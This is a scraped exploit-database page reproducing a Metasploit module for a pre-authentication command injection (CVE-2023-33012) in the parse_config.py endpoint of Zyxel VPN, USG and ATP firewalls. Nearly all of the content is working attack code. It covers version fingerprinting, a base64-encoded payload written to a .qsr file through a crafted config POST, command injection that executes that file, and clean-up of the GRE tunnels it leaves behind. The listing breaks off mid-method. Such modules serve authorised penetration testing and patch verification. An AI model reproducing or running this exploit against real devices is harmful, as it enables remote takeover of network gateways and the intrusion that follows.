---
title: Zyxel parse_config.py Command Injection
url: https://cxsecurity.com/issue/WLB-2024070009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-07-05
fetch_date: 2025-10-06T17:38:27.956126
---

# Zyxel parse_config.py Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zyxel parse\_config.py Command Injection** **2024.07.04**  Credit:  **[jheysel-r7](https://cxsecurity.com/author/jheysel-r7/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Zyxel parse\_config.py Command Injection',
'Description' => %q{
This module exploits vulnerabilities in multiple Zyxel devices including the VPN, USG and APT series.
The affected firmware versions depend on the device module, see this module's documentation for more details.
Note this module was unable to be tested against a real Zyxel device and was tested against a mock environment.
If you run into any issues testing this in a real environment we kindly ask you raise an issue in
metasploit's github repository: https://github.com/rapid7/metasploit-framework/issues/new/choose
},
'Author' => [
'SSD Secure Disclosure technical team', # discovery
'jheysel-r7' # Msf module
],
'References' => [
[ 'URL', 'https://ssd-disclosure.com/ssd-advisory-zyxel-vpn-series-pre-auth-remote-command-execution/'],
[ 'CVE', '2023-33012']
],
'License' => MSF\_LICENSE,
'Platform' => ['linux', 'unix'],
'Privileged' => true,
'Arch' => [ ARCH\_CMD ],
'Targets' => [
[ 'Automatic Target', {}]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2024-01-24',
'Notes' => {
'Stability' => [ CRASH\_SAFE, ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES ],
'Reliability' => [ ] # This vulnerability can only be exploited once, more info: https://vulncheck.com/blog/zyxel-cve-2023-33012#you-get-one-shot
}
)
)
register\_options(
[
OptString.new('WRITABLE\_DIR', [ true, 'A directory where we can write files', '/tmp' ]),
]
)
end
def check
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'ext-js', 'app', 'common', 'zld\_product\_spec.js')
})
return CheckCode::Unknown('No response from /ext-js/app/common/zld\_product\_spec.js') if res.nil?
if res.code == 200
product\_match = res.body.match(/ZLDSYSPARM\_PRODUCT\_NAME1="([^"]\*)"/)
version\_match = res.body.match(/ZLDCONFIG\_CLOUD\_HELP\_VERSION=([\d.]+)/)
if product\_match && version\_match
product = product\_match[1]
version = version\_match[1]
if (product.starts\_with?('USG') && product.include?('W') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.10')) ||
(product.starts\_with?('USG') && !product.include?('W') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.00')) ||
(product.starts\_with?('ATP') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.10')) ||
(product.starts\_with?('VPN') && Rex::Version.new(version) <= Rex::Version.new('5.36.2') && Rex::Version.new(version) >= Rex::Version.new('5.00'))
return CheckCode::Appears("Product: #{product}, Version: #{version}")
else
return CheckCode::Safe("Product: #{product}, Version: #{version}")
end
end
end
CheckCode::Unknown('Version and product info were unable to be determined.')
end
def on\_new\_session(session)
super
command\_output = ''
# Get the most recently created GRE tunnel interface, bring it down then delete it to allow for subsequent module runs.
if session.type.to\_s.eql? 'meterpreter'
newest\_gre = session.sys.process.execute '/bin/sh', "-c \"ip -d link show type gre | grep -oP '^\\d+: \\K[^@]+' | tail -n 1\""
print\_good("Found the most recently created GRE tunnel interface: #{newest\_gre}. Going to delete it to allow for subsequent module runs.")
command\_output = session.sys.process.execute '/bin/sh', "-c \"ifconfig #{newest\_gre} down && ip tunnel del #{newest\_gre} mode gre && echo success\""
elsif session.type.to\_s.eql? 'shell'
newest\_gre = session.shell\_command\_token "ip -d link show type gre | grep -oP '^\\d+: \\K[^@]+' | tail -n 1"
print\_good("Found the most recently created GRE tunnel interface: #{newest\_gre}. Going to delete it to allow for subsequent module runs.")
command\_output = session.shell\_command\_token "ifconfig #{newest\_gre} down && ip tunnel del #{newest\_gre} mode gre && echo success"
end
if command\_output.include?('success')
print\_good('The GRE interface was successfully removed.')
else
print\_warning('The module failed to remove the GRE interface created by this exploit. Subsequent module runs will likely fail unless unless it\'s successfully removed')
end
end
def exploit
# Command injection has a 0x14 byte length limit so keep the file name as small as possible.
# The length limit is also why we leverage the arbitrary file write -> write our payload to the .qrs file then execute it with the command injection.
filename = rand\_text\_alpha(1)
payload\_filepath = "#{datastore['WRITABLE\_DIR']}/#{filename}.qsr"
command = payload.raw
command += ' '
command += <<~CMD
2>/var/log/ztplog 1>/var/log/ztplog
(sleep 10 && /bin/rm -rf #{payload\_filepath}) &
CMD
command = "echo #{Rex::Text.encode\_base64(command)} | base64 -d > #{payload\_filepath} ; . #{payload\_filepath}"
file\_write\_pload = "option proto vti\n"
file\_write\_pload += "option #{command};exit\n"
file\_write\_pload += "option name 1\n"
config = Base64.strict\_encode64(file\_write\_pload)
data = { 'config' => config, 'fqdn' => "\x00" }
print\_status('Attempting to upload the payload via QSR file write...')
file\_write\_res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'ztp', 'cgi-bin', 'parse\_config.py'),
'data' => data.to\_s
})
unless file\_write\_res && !file\_write\_res.body.include?('ParseError: 0xC0DE0005')
fail\_with(Failure::PayloadFailed, 'The response from the target indicates the payload transfer was unsuc...